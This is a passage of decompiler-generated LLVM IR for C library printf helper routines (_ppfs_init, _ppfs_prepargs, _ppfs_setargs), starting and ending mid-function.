  %v2_10890 = icmp ult i32 %v1_10894, 128
  %.v1_10894 = select i1 %v2_10890, i32 %v1_10894, i32 128
  store i32 %.v1_10894, i32* @r2, align 4
  %v0_1089c = call i32 @__GI_wcsrtombs()
  store i32 %v0_1089c, i32* @r4, align 4
  %v2_108a0 = icmp eq i32 %v0_1089c, 0
  store i32 %v0_1089c, i32* %r3.global-to-local, align 4
  store i32 %v2_1078c, i32* %r0.global-to-local, align 4
  %v0_108b0 = load i32, i32* @fp, align 4
  store i32 %v0_108b0, i32* %r2.global-to-local, align 4
  br i1 %v2_108a0, label %dec_label_pc_108c0, label %dec_label_pc_108b8

dec_label_pc_108b8:                               ; preds = %dec_label_pc_10890
  %v3_108b8 = call i32 @__stdio_fwrite(i32 %v2_1078c, i32 %v0_1089c, i32 %v0_108b0)
  store i32 %v3_108b8, i32* %r0.global-to-local, align 4
  store i32 %v3_108b8, i32* %r3.global-to-local, align 4
  %v1_108c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_108c0

dec_label_pc_108c0:                               ; preds = %dec_label_pc_10890, %dec_label_pc_108b8
  %v1_108c0 = phi i32 [ 0, %dec_label_pc_10890 ], [ %v1_108c0.pre, %dec_label_pc_108b8 ]
  %v0_108c4 = phi i32 [ 0, %dec_label_pc_10890 ], [ %v3_108b8, %dec_label_pc_108b8 ]
  %v9_108c0 = icmp eq i32 %v0_108c4, %v1_108c0
  %v1_108c4 = load i32, i32* @r5, align 4
  %v2_108c4 = sub i32 %v1_108c4, %v0_108c4
  store i32 %v2_108c4, i32* @r5, align 4
  br i1 %v9_108c0, label %dec_label_pc_108cc, label %dec_label_pc_10910

dec_label_pc_108ccthread-pre-split:               ; preds = %dec_label_pc_10858
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_108d0.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_108cc

dec_label_pc_108cc:                               ; preds = %dec_label_pc_108ccthread-pre-split, %dec_label_pc_108c0
  %v1_10894 = phi i32 [ %v0_108d0.pr, %dec_label_pc_108ccthread-pre-split ], [ %v2_108c4, %dec_label_pc_108c0 ]
  store i32 %v2_1078c, i32* @r6, align 4
  %v2_108d0 = icmp eq i32 %v1_10894, 0
  store i32 %v2_106a8, i32* @r1, align 4
  store i32 %v2_106bc, i32* %r3.global-to-local, align 4
  store i32 %v2_1078c, i32* @r0, align 4
  br i1 %v2_108d0, label %dec_label_pc_108e4, label %dec_label_pc_10890

dec_label_pc_108e4:                               ; preds = %dec_label_pc_108cc, %.thread36
  %v0_108e4 = load i32, i32* @fp, align 4
  store i32 %v0_108e4, i32* %r0.global-to-local, align 4
  %v0_108ec = load i32, i32* @sl, align 4
  store i32 %v0_108ec, i32* %r2.global-to-local, align 4
  %v4_108f0 = call i32 @_charpad(i32 %v0_108e4, i8 32, i32 %v0_108ec)
  store i32 %v4_108f0, i32* %r0.global-to-local, align 4
  %v1_108f4 = load i32, i32* @sl, align 4
  %v9_108f4 = icmp eq i32 %v4_108f0, %v1_108f4
  br i1 %v9_108f4, label %dec_label_pc_108fc, label %dec_label_pc_10910

dec_label_pc_108fc:                               ; preds = %dec_label_pc_108e4, %dec_label_pc_1066c, %dec_label_pc_10490
  %stack_var_-316.3 = phi i32 [ %v0_104e4, %dec_label_pc_10490 ], [ %v0_10808, %dec_label_pc_108e4 ], [ %v0_104e4, %dec_label_pc_1066c ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_10490 ], [ %v2_107f4, %dec_label_pc_108e4 ], [ %v2_10670, %dec_label_pc_1066c ]
  %v3_108fc = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_108fc, i32* @r4, align 4
  br label %dec_label_pc_10900

dec_label_pc_10900:                               ; preds = %dec_label_pc_103a0, %dec_label_pc_108fc
  %v0_10900 = phi i32 [ %v0_10900.pre, %dec_label_pc_103a0 ], [ %v3_108fc, %dec_label_pc_108fc ]
  %v0_104e4 = phi i32 [ %tmp100, %dec_label_pc_103a0 ], [ %stack_var_-316.3, %dec_label_pc_108fc ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_103a0 ], [ %stack_var_-336.3, %dec_label_pc_108fc ]
  store i32 %v0_10900, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_103b8.outer

dec_label_pc_103b8.outer:                         ; preds = %dec_label_pc_10908, %dec_label_pc_10900
  %v5_103e4 = phi i32 [ %v1_10414, %dec_label_pc_10908 ], [ %v0_10900, %dec_label_pc_10900 ]
  %v0_103b849 = phi i32 [ %v1_10908, %dec_label_pc_10908 ], [ %v0_10900, %dec_label_pc_10900 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_10908 ], [ %stack_var_-336.4, %dec_label_pc_10900 ]
  %v1_103b8180 = inttoptr i32 %v0_103b849 to i8*
  %v2_103b8181 = load i8, i8* %v1_103b8180, align 1
  %v3_103b8182 = zext i8 %v2_103b8181 to i32
  store i32 %v3_103b8182, i32* %r3.global-to-local, align 4
  %v2_103bc183 = icmp eq i8 %v2_103b8181, 0
  br i1 %v2_103bc183, label %dec_label_pc_103d4, label %bb126

dec_label_pc_10908:                               ; preds = %dec_label_pc_10414
  %v1_10908 = add i32 %v0_1041c, 2
  store i32 %v1_10908, i32* @r4, align 4
  br label %dec_label_pc_103b8.outer

dec_label_pc_10910:                               ; preds = %dec_label_pc_10780, %dec_label_pc_108e4, %.thread36, %dec_label_pc_10830, %dec_label_pc_10814, %dec_label_pc_106e4, %bb162, %dec_label_pc_10648, %bb130, %dec_label_pc_108c0
  br label %dec_label_pc_10918

dec_label_pc_10918:                               ; preds = %dec_label_pc_10408, %bb, %dec_label_pc_10388, %dec_label_pc_10910
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_10388 ], [ -1, %dec_label_pc_10910 ], [ %stack_var_-336.2, %dec_label_pc_10408 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_10344, i32* @r5, align 4
  store i32 %v15_10344, i32* %r8.global-to-local, align 4
  store i32 %v18_10344, i32* @sb, align 4
  store i32 %v21_10344, i32* @sl, align 4
  store i32 %v24_10344, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_10908, { 1, 0 }
  uselistorder i8 %v2_103b8181, { 1, 2, 0 }
  uselistorder i32 %v0_103b849, { 2, 0, 1 }
  uselistorder i32 %v5_103e4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_104e4, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_10900, { 1, 0, 2 }
  uselistorder i32 %v1_10894, { 2, 1, 0 }
  uselistorder i32 %v0_1089c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1081c, { 1, 0 }
  uselistorder i32 %v2_10800, { 2, 0, 1 }
  uselistorder i1 %v3_107e0, { 1, 0 }
  uselistorder i32 %v0_107f0, { 0, 2, 3, 1 }
  uselistorder i32 %v2_107c4, { 1, 0 }
  uselistorder i32 %v0_10808, { 1, 0, 2 }
  uselistorder i32 %v3_10798, { 1, 2, 0 }
  uselistorder i32 %v0_10748, { 1, 0 }
  uselistorder i32 %v2_1072c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_106f4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_106c0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_105c4, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_105e0, { 1, 2, 3, 0 }
  uselistorder i32 %v6_10560, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_104c4, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_10474.pre, { 2, 1, 0 }
  uselistorder i32 %v1_1046c, { 1, 0 }
  uselistorder i32 %v1_10414, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_103d4, { 1, 0 }
  uselistorder i32 %v1_103cc.lcssa, { 1, 0 }
  uselistorder i8 %v2_103b8, { 1, 2, 0 }
  uselistorder i32 %v2_103cc, { 1, 2, 3, 0 }
  uselistorder i1 %v7_105d8, { 1, 0 }
  uselistorder i1 %v7_10524, { 1, 2, 0 }
  uselistorder i1 %v7_1071c, { 1, 0 }
  uselistorder i1 %v7_1067c, { 1, 0 }
  uselistorder i1 %v7_10568, { 1, 0 }
  uselistorder i32 %v2_106bc, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1078c, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_1049c, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_10470, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_10450, { 1, 2, 0 }
  uselistorder i32 %v4_10448, { 1, 0 }
  uselistorder i32 %v2_1034c, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 38, 2, 3, 0, 1, 4, 5, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 39, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r2.global-to-local, { 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 26, 20, 21, 23, 24, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 7, 6, 9, 8, 10, 11, 13, 12, 15, 14, 16, 17, 20, 18, 19, 22, 21, 24, 23, 26, 25, 28, 27, 32, 29, 30, 31, 1, 33, 34, 44, 35, 45, 2, 37, 36, 39, 38, 41, 40, 43, 42, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_10918, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10910, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10900, { 1, 0 }
  uselistorder label %dec_label_pc_108c0, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_10830, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_107dc, { 1, 0 }
  uselistorder label %dec_label_pc_107c0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_107c0thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_107b4, { 1, 0 }
  uselistorder label %dec_label_pc_107a4, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_10738, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_10514, { 1, 0 }
  uselistorder label %dec_label_pc_10510, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10468, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_10408, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_103d4, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_10938 = load i32, i32* @r4, align 4
  store i32 %v3_10938, i32* %stack_var_-12, align 4
  %v6_10938 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_10944 = load i32, i32* @r1, align 4
  store i32 %v0_10944, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1094c = bitcast i32* %arg1 to i8*
  %v3_1094c = call i32 @__GI_memset(i8* %v2_1094c, i32 0)
  %v0_10950 = load i32, i32* @r4, align 4
  %v1_10950 = add i32 %v0_10950, 24
  %v2_10950 = inttoptr i32 %v1_10950 to i32*
  %v3_10950 = load i32, i32* %v2_10950, align 4
  %v1_10954 = add i32 %v3_10950, -1
  store i32 %v1_10954, i32* %v2_10950, align 4
  %v0_1095c = load i32, i32* @r5, align 4
  %v1_1095c = load i32, i32* @r4, align 4
  %v2_1095c = inttoptr i32 %v1_1095c to i32*
  store i32 %v0_1095c, i32* %v2_1095c, align 4
  %v0_10960 = load i32, i32* @r4, align 4
  %v1_10960 = add i32 %v0_10960, 40
  store i32 %v1_10960, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_1097019 = inttoptr i32 %v1_10960 to i32*
  store i32 8, i32* %v2_1097019, align 4
  %v3_1097020 = load i32, i32* %r1.global-to-local, align 4
  %v4_1097021 = add i32 %v3_1097020, 4
  store i32 %v4_1097021, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10968.dec_label_pc_10968_crit_edge

dec_label_pc_10968.dec_label_pc_10968_crit_edge:  ; preds = %entry, %dec_label_pc_10968.dec_label_pc_10968_crit_edge
  %v4_1097022 = phi i32 [ %v4_1097021, %entry ], [ %v4_10970, %dec_label_pc_10968.dec_label_pc_10968_crit_edge ]
  %v0_1096c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1096c = add i32 %v0_1096c.pre, -1
  store i32 %v1_1096c, i32* %r2.global-to-local, align 4
  %v7_1096c = icmp eq i32 %v0_1096c.pre, 1
  %v2_10970 = inttoptr i32 %v4_1097022 to i32*
  store i32 8, i32* %v2_10970, align 4
  %v3_10970 = load i32, i32* %r1.global-to-local, align 4
  %v4_10970 = add i32 %v3_10970, 4
  store i32 %v4_10970, i32* %r1.global-to-local, align 4
  br i1 %v7_1096c, label %dec_label_pc_10978, label %dec_label_pc_10968.dec_label_pc_10968_crit_edge

dec_label_pc_10978:                               ; preds = %dec_label_pc_10968.dec_label_pc_10968_crit_edge
  %v0_10978 = load i32, i32* @r5, align 4
  store i32 %v0_10978, i32* %r2.global-to-local, align 4
  %v1_109bc3 = inttoptr i32 %v0_10978 to i8*
  %v2_109bc4 = load i8, i8* %v1_109bc3, align 1
  %v2_109c06 = icmp eq i8 %v2_109bc4, 0
  br i1 %v2_109c06, label %dec_label_pc_109c8, label %dec_label_pc_10988

dec_label_pc_10980:                               ; preds = %dec_label_pc_109a0
  %v2_10984 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10984, i32* @r4, align 4
  store i32 %v6_10938, i32* @r5, align 4
  ret i32 -1

dec_label_pc_10988:                               ; preds = %dec_label_pc_10978, %dec_label_pc_109bc.backedge
  %v0_10990 = phi i32 [ %storemerge, %dec_label_pc_109bc.backedge ], [ %v0_10978, %dec_label_pc_10978 ]
  %v2_109bc7 = phi i8 [ %v2_109bc, %dec_label_pc_109bc.backedge ], [ %v2_109bc4, %dec_label_pc_10978 ]
  %v7_10988 = icmp eq i8 %v2_109bc7, 37
  br i1 %v7_10988, label %dec_label_pc_10990, label %dec_label_pc_109b8

dec_label_pc_10990:                               ; preds = %dec_label_pc_10988
  %v1_10990 = add i32 %v0_10990, 1
  %v2_10990 = inttoptr i32 %v1_10990 to i8*
  %v3_10990 = load i8, i8* %v2_10990, align 1
  store i32 %v1_10990, i32* %r2.global-to-local, align 4
  %v7_10994 = icmp eq i8 %v3_10990, 37
  br i1 %v7_10994, label %dec_label_pc_109b8, label %dec_label_pc_109a0

dec_label_pc_109a0:                               ; preds = %dec_label_pc_10990
  %v0_10998 = load i32, i32* @r4, align 4
  %v2_109a0 = inttoptr i32 %v0_10998 to i32*
  store i32 %v1_10990, i32* %v2_109a0, align 4
  %v2_109a4 = call i32 @_ppfs_parsespec(i32* %v2_109a0)
  %v1_109a8 = icmp slt i32 %v2_109a4, 0
  br i1 %v1_109a8, label %dec_label_pc_10980, label %dec_label_pc_109b0

dec_label_pc_109b0:                               ; preds = %dec_label_pc_109a0
  %v0_109b0 = load i32, i32* @r4, align 4
  %v1_109b0 = inttoptr i32 %v0_109b0 to i32*
  %v2_109b0 = load i32, i32* %v1_109b0, align 4
  br label %dec_label_pc_109bc.backedge

dec_label_pc_109b8:                               ; preds = %dec_label_pc_10988, %dec_label_pc_10990
  %v0_109b8 = phi i32 [ %v0_10990, %dec_label_pc_10988 ], [ %v1_10990, %dec_label_pc_10990 ]
  %v1_109b8 = add i32 %v0_109b8, 1
  br label %dec_label_pc_109bc.backedge

dec_label_pc_109bc.backedge:                      ; preds = %dec_label_pc_109b8, %dec_label_pc_109b0
  %storemerge = phi i32 [ %v1_109b8, %dec_label_pc_109b8 ], [ %v2_109b0, %dec_label_pc_109b0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_109bc = inttoptr i32 %storemerge to i8*
  %v2_109bc = load i8, i8* %v1_109bc, align 1
  %v2_109c0 = icmp eq i8 %v2_109bc, 0
  br i1 %v2_109c0, label %dec_label_pc_109bc.dec_label_pc_109c8_crit_edge, label %dec_label_pc_10988

dec_label_pc_109bc.dec_label_pc_109c8_crit_edge:  ; preds = %dec_label_pc_109bc.backedge
  %v0_109c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_109c8

dec_label_pc_109c8:                               ; preds = %dec_label_pc_109bc.dec_label_pc_109c8_crit_edge, %dec_label_pc_10978
  %v0_109c8 = phi i32 [ %v0_109c8.pre, %dec_label_pc_109bc.dec_label_pc_109c8_crit_edge ], [ %v0_10978, %dec_label_pc_10978 ]
  %v3_109bc.lcssa.in = phi i8 [ %v2_109bc, %dec_label_pc_109bc.dec_label_pc_109c8_crit_edge ], [ %v2_109bc4, %dec_label_pc_10978 ]
  %v3_109bc.lcssa = zext i8 %v3_109bc.lcssa.in to i32
  %v1_109c8 = load i32, i32* @r4, align 4
  %v2_109c8 = inttoptr i32 %v1_109c8 to i32*
  store i32 %v0_109c8, i32* %v2_109c8, align 4
  %v2_109cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_109cc, i32* @r4, align 4
  store i32 %v6_10938, i32* @r5, align 4
  ret i32 %v3_109bc.lcssa

; uselistorder directives
  uselistorder i8 %v2_109bc, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10978, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10970, { 1, 0 }
  uselistorder i32 %v0_1096c.pre, { 1, 0 }
  uselistorder i32 %v6_10938, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder label %dec_label_pc_109b8, { 1, 0 }
  uselistorder label %dec_label_pc_10988, { 1, 0 }
  uselistorder label %dec_label_pc_10968.dec_label_pc_10968_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_109d0 = load i32, i32* @r4, align 4
  store i32 %v3_109d0, i32* %stack_var_-12, align 4
  %v1_109d4 = add i32 %arg1, 24
  %v2_109d4 = inttoptr i32 %v1_109d4 to i32*
  %v3_109d4 = load i32, i32* %v2_109d4, align 4
  store i32 %v3_109d4, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_109e4 = add i32 %arg1, 76
  %v3_109e4 = inttoptr i32 %v2_109e4 to i32*
  store i32 %arg2, i32* %v3_109e4, align 4
  %v7_109e8 = icmp sgt i32 %v3_109d4, 0
  br i1 %v7_109e8, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_109e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_109e8, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_109ec = load i32, i32* %r3.global-to-local, align 4
  %v2_109ec = add i32 %arg1, 8
  %v3_109ec = inttoptr i32 %v2_109ec to i32*
  store i32 %v0_109ec, i32* %v3_109ec, align 4
  %v0_109f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_109f0 = add i32 %arg1, 28
  %v3_109f0 = inttoptr i32 %v2_109f0 to i32*
  store i32 %v0_109f0, i32* %v3_109f0, align 4
  %v0_109f4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_109f4, i32* %v2_109d4, align 4
  %v0_109f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_109f8 = add i32 %arg1, 4
  %v3_109f8 = inttoptr i32 %v2_109f8 to i32*
  store i32 %v0_109f8, i32* %v3_109f8, align 4
  %v0_109fc = call i32 @_ppfs_setargs()
  %v0_10a00 = load i32, i32* %r5.global-to-local, align 4
  %v1_10a00 = load i32, i32* @r4, align 4
  %v2_10a00 = add i32 %v1_10a00, 24
  %v3_10a00 = inttoptr i32 %v2_10a00 to i32*
  store i32 %v0_10a00, i32* %v3_10a00, align 4
  %v2_10a04 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10a04, i32* @r4, align 4
  ret i32 %v0_109fc

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 6, 5, 2, 1, 4, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_10a08 = load i32, i32* @r0, align 4
  %v1_10a08 = add i32 %v0_10a08, 24
  %v2_10a08 = inttoptr i32 %v1_10a08 to i32*
  %v3_10a08 = load i32, i32* %v2_10a08, align 4
  store i32 %v3_10a08, i32* %r1.global-to-local, align 4
  %v2_10a0c = icmp eq i32 %v3_10a08, 0
  %v3_10a10 = load i32, i32* @r4, align 4
  store i32 %v3_10a10, i32* %stack_var_-8, align 4
  %v1_10a14 = add i32 %v0_10a08, 80
  store i32 %v1_10a14, i32* %ip.global-to-local, align 4
  %v1_10a18 = add i32 %v0_10a08, 8
  %v2_10a18 = inttoptr i32 %v1_10a18 to i32*
  %v3_10a18 = load i32, i32* %v2_10a18, align 4
  store i32 %v3_10a18, i32* %r3.global-to-local, align 4
  %v6_10a20 = icmp eq i32 %v3_10a18, -2147483648
  br i1 %v2_10a0c, label %dec_label_pc_10a20, label %dec_label_pc_10b44

dec_label_pc_10a20:                               ; preds = %entry
  br i1 %v6_10a20, label %dec_label_pc_10a28, label %dec_label_pc_10a40

dec_label_pc_10a28:                               ; preds = %dec_label_pc_10a20
  %v1_10a28 = add i32 %v0_10a08, 76
  %v2_10a28 = inttoptr i32 %v1_10a28 to i32*
  %v3_10a28 = load i32, i32* %v2_10a28, align 4
  store i32 %v3_10a28, i32* %r3.global-to-local, align 4
  %v1_10a2c = inttoptr i32 %v3_10a28 to i32*
  %v2_10a2c = load i32, i32* %v1_10a2c, align 4
  store i32 %v2_10a2c, i32* %r2.global-to-local, align 4
  %v1_10a30 = add i32 %v3_10a28, 4
  store i32 %v1_10a30, i32* %r3.global-to-local, align 4
  store i32 %v1_10a30, i32* %v2_10a28, align 4
  %v0_10a38 = load i32, i32* %r2.global-to-local, align 4
  %v1_10a38 = load i32, i32* @r0, align 4
  %v2_10a38 = add i32 %v1_10a38, 8
  %v3_10a38 = inttoptr i32 %v2_10a38 to i32*
  store i32 %v0_10a38, i32* %v3_10a38, align 4
  %v0_10a3c = load i32, i32* %r2.global-to-local, align 4
  %v1_10a3c = load i32, i32* @r0, align 4
  %v2_10a3c = add i32 %v1_10a3c, 80
  %v3_10a3c = inttoptr i32 %v2_10a3c to i32*
  store i32 %v0_10a3c, i32* %v3_10a3c, align 4
  %v0_10a40.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10a40

dec_label_pc_10a40:                               ; preds = %dec_label_pc_10a20, %dec_label_pc_10a28
  %v1_10a58 = phi i32 [ %v0_10a08, %dec_label_pc_10a20 ], [ %v0_10a40.pre, %dec_label_pc_10a28 ]
  %v1_10a40 = add i32 %v1_10a58, 4
  %v2_10a40 = inttoptr i32 %v1_10a40 to i32*
  %v3_10a40 = load i32, i32* %v2_10a40, align 4
  store i32 %v3_10a40, i32* %r3.global-to-local, align 4
  %v6_10a44 = icmp eq i32 %v3_10a40, -2147483648
  br i1 %v6_10a44, label %dec_label_pc_10a4c, label %dec_label_pc_10a64

dec_label_pc_10a4c:                               ; preds = %dec_label_pc_10a40
  %v1_10a4c = add i32 %v1_10a58, 76
  %v2_10a4c = inttoptr i32 %v1_10a4c to i32*
  %v3_10a4c = load i32, i32* %v2_10a4c, align 4
  store i32 %v3_10a4c, i32* %r3.global-to-local, align 4
  %v1_10a50 = inttoptr i32 %v3_10a4c to i32*
  %v2_10a50 = load i32, i32* %v1_10a50, align 4
  store i32 %v2_10a50, i32* %r2.global-to-local, align 4
  %v1_10a54 = add i32 %v3_10a4c, 4
  store i32 %v1_10a54, i32* %r3.global-to-local, align 4
  store i32 %v1_10a54, i32* %v2_10a4c, align 4
  %v0_10a5c = load i32, i32* %r2.global-to-local, align 4
  %v1_10a5c = load i32, i32* @r0, align 4
  %v2_10a5c = add i32 %v1_10a5c, 4
  %v3_10a5c = inttoptr i32 %v2_10a5c to i32*
  store i32 %v0_10a5c, i32* %v3_10a5c, align 4
  %v0_10a60 = load i32, i32* %r2.global-to-local, align 4
  %v1_10a60 = load i32, i32* @r0, align 4
  %v2_10a60 = add i32 %v1_10a60, 80
  %v3_10a60 = inttoptr i32 %v2_10a60 to i32*
  store i32 %v0_10a60, i32* %v3_10a60, align 4
  %v0_10b3418.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10a64

dec_label_pc_10a64:                               ; preds = %dec_label_pc_10a40, %dec_label_pc_10a4c
  %v0_10b3418 = phi i32 [ %v1_10a58, %dec_label_pc_10a40 ], [ %v0_10b3418.pre, %dec_label_pc_10a4c ]
  %v0_10a64 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10a64, i32* %lr.global-to-local, align 4
  %v1_10b3419 = add i32 %v0_10b3418, 28
  %v2_10b3420 = inttoptr i32 %v1_10b3419 to i32*
  %v3_10b3421 = load i32, i32* %v2_10b3420, align 4
  store i32 %v3_10b3421, i32* %r3.global-to-local, align 4
  %v5_10b3c23 = icmp slt i32 %v0_10a64, %v3_10b3421
  br i1 %v5_10b3c23, label %dec_label_pc_10a6c, label %dec_label_pc_10b40.loopexit

dec_label_pc_10a6c:                               ; preds = %dec_label_pc_10a64, %dec_label_pc_10b30
  %v0_10b3425 = phi i32 [ %v0_10b34, %dec_label_pc_10b30 ], [ %v0_10b3418, %dec_label_pc_10a64 ]
  %v1_10a6c24 = phi i32 [ %v1_10b30, %dec_label_pc_10b30 ], [ %v0_10a64, %dec_label_pc_10a64 ]
  %v4_10a6c = mul i32 %v1_10a6c24, 4
  %v5_10a6c = add i32 %v0_10b3425, %v4_10a6c
  store i32 %v5_10a6c, i32* %r3.global-to-local, align 4
  %v1_10a70 = add i32 %v5_10a6c, 40
  %v2_10a70 = inttoptr i32 %v1_10a70 to i32*
  %v3_10a70 = load i32, i32* %v2_10a70, align 4
  store i32 %v3_10a70, i32* %r2.global-to-local, align 4
  %v7_10a74 = icmp eq i32 %v3_10a70, 8
  br i1 %v7_10a74, label %dec_label_pc_10b30, label %dec_label_pc_10a7c

dec_label_pc_10a7c:                               ; preds = %dec_label_pc_10a6c
  %v1_10a7c = add i32 %v0_10b3425, 76
  %v2_10a7c = inttoptr i32 %v1_10a7c to i32*
  %v3_10a7c = load i32, i32* %v2_10a7c, align 4
  store i32 %v3_10a7c, i32* %r1.global-to-local, align 4
  %v8_10a80 = icmp sgt i32 %v3_10a70, 8
  br i1 %v8_10a80, label %dec_label_pc_10aa4, label %dec_label_pc_10a84

dec_label_pc_10a84:                               ; preds = %dec_label_pc_10a7c
  %v7_10a84 = icmp eq i32 %v3_10a70, 2
  br i1 %v7_10a84, label %dec_label_pc_10af0, label %dec_label_pc_10a8c

dec_label_pc_10a8c:                               ; preds = %dec_label_pc_10a84
  %v8_10a8c = icmp sgt i32 %v3_10a70, 2
  br i1 %v8_10a8c, label %dec_label_pc_10a9c, label %dec_label_pc_10a90

dec_label_pc_10a90:                               ; preds = %dec_label_pc_10a8c
  %v1_10a90 = icmp slt i32 %v3_10a70, 0
